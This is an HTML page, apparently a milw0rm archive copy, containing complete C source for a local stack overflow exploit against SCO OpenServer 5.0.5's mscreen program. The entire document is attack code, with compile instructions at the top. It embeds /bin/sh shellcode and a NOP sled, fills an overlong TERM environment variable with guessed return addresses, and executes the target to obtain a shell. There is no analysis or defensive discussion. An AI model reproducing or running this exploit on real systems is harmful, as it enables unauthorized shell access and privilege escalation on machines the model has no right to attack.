<html><head><title>SCO OpenServer 5.0.5 Env Local Stack Overflow Exploit</title></head><pre>/*      Copyright (c) 2000 ADM                                  */
/*      All Rights Reserved                                     */
/*      THIS IS UNPUBLISHED PROPRIETARY SOURCE CODE OF ADM      */
/*      The copyright notice above does not evidence any        */
/*      actual or intended publication of such source code.     */
/*                                                              */
/*      Title:        SCO OpenServer mscreen                    */
/*      Tested under: SCO OpenServer 5.0.5                      */
/*      By:           K2                                        */
/*      Use:          gcc -o mscreen sco-mscreen.c              */
/*                                                              */

#include &lt;unistd.h&gt;
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;

char shell[] =
  /* doble@iname.com */
   &quot;\xeb\x1b\x5e\x31\xdb\x89\x5e\x07\x89\x5e\x0c\x88\x5e\x11\x31\xc0&quot;
   &quot;\xb0\x3b\x8d\x7e\x07\x89\xf9\x53\x51\x56\x56\xeb\x10\xe8\xe0\xff&quot;
   &quot;\xff\xff/bin/sh\xaa\xaa\xaa\xaa\x9a\xaa\xaa\xaa\xaa\x07\xaa&quot;;
   
#define SIZE 130
#define NOPDEF 40
#define DEFOFF -200
#define EGG 500

const char x86_nop=0x90;
long nop,esp;
long offset=DEFOFF;
char buffer[SIZE];
char egg[EGG];

long get_esp() { __asm__(&quot;movl %esp,%eax&quot;); }

int main (int argc, char *argv[]) {
    int i;
    if (argc &gt; 1) offset += strtol(argv[1], NULL, 0);
    if (argc &gt; 2) nop += strtoul(argv[2], NULL, 0);
    else
        nop = NOPDEF;
    esp = get_esp();
    memset(egg,x86_nop,EGG);
    memcpy(egg+300, shell, strlen(shell));
    memset(buffer, x86_nop, SIZE);
    memcpy(buffer+nop, shell, strlen(shell));
    for (i = 1; i &lt; SIZE-4; i += 4) {
        *((int *) &amp;buffer[i]) = esp+offset;
    }
    memcpy(egg,&quot;HOSTNAME=&quot;,9);  /* just playin */
    memcpy(buffer,&quot;TERM=&quot;,5);   /* here's the overflow */
    putenv(egg);
    putenv(buffer);
    printf(&quot;offset = [0x%x]\n&quot;,esp+offset);
    execl(&quot;/usr/bin/mscreen&quot;, &quot;mscreen&quot;, NULL);
    printf(&quot;exec failed!\n&quot;);
    return 0;
}


// milw0rm.com [2001-01-26]</pre></html>